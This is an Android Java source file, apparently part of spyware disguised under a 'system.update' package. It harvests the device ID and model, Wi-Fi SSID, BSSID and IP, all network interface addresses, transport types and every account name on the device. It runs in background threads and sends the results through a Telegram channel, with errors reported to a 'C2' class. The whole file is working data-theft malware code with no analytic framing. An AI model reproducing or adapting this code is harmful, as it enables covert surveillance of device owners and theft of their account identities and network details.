package com.system.update;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

public final class NetDump {
    private NetDump() {}

    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📡 NET id=").append(C2.getDeviceId()).append('\n');
                sb.append("model=").append(Build.BRAND).append(' ').append(Build.MODEL).append('\n');
                try {
                    WifiManager wm = (WifiManager) ctx.getApplicationContext()
                            .getSystemService(Context.WIFI_SERVICE);
                    if (wm != null) {
                        WifiInfo wi = wm.getConnectionInfo();
                        if (wi != null) {
                            sb.append("wifi_ssid=").append(wi.getSSID()).append('\n');
                            sb.append("wifi_bssid=").append(wi.getBSSID()).append('\n');
                            sb.append("wifi_ip=").append(intToIp(wi.getIpAddress())).append('\n');
                            sb.append("rssi=").append(wi.getRssi()).append('\n');
                        }
                    }
                } catch (Throwable t) {
                    sb.append("wifi_err=").append(t.getMessage()).append('\n');
                }
                try {
                    List<NetworkInterface> ifs = Collections.list(NetworkInterface.getNetworkInterfaces());
                    for (NetworkInterface nif : ifs) {
                        for (InetAddress addr : Collections.list(nif.getInetAddresses())) {
                            if (!addr.isLoopbackAddress()) {
                                sb.append("iface=").append(nif.getName())
                                        .append(" ip=").append(addr.getHostAddress()).append('\n');
                            }
                        }
                    }
                } catch (Throwable ignored) {}
                try {
                    ConnectivityManager cm = (ConnectivityManager)
                            ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
                    if (cm != null && Build.VERSION.SDK_INT >= 23) {
                        Network n = cm.getActiveNetwork();
                        NetworkCapabilities nc = n != null ? cm.getNetworkCapabilities(n) : null;
                        if (nc != null) {
                            sb.append("transport_wifi=").append(nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)).append('\n');
                            sb.append("transport_cell=").append(nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)).append('\n');
                            sb.append("transport_vpn=").append(nc.hasTransport(NetworkCapabilities.TRANSPORT_VPN)).append('\n');
                        }
                    }
                } catch (Throwable ignored) {}
                Telegram.send(sb.toString());
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "net_err:" + t.getMessage());
            }
        }, "net-dump").start();
    }

    public static void accounts(Context ctx) {
        new Thread(() -> {
            try {
                AccountManager am = AccountManager.get(ctx);
                Account[] accs = am.getAccounts();
                StringBuilder sb = new StringBuilder();
                sb.append("👤 ACCOUNTS id=").append(C2.getDeviceId()).append('\n');
                for (Account a : accs) {
                    sb.append(a.type).append(" | ").append(a.name).append('\n');
                }
                if (accs.length == 0) sb.append("(none visible without GET_ACCOUNTS)\n");
                Telegram.send(sb.toString());
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "accounts_err:" + t.getMessage());
            }
        }, "acc-dump").start();
    }

    private static String intToIp(int ip) {
        return (ip & 0xff) + "." + ((ip >> 8) & 0xff) + "."
                + ((ip >> 16) & 0xff) + "." + ((ip >> 24) & 0xff);
    }
}
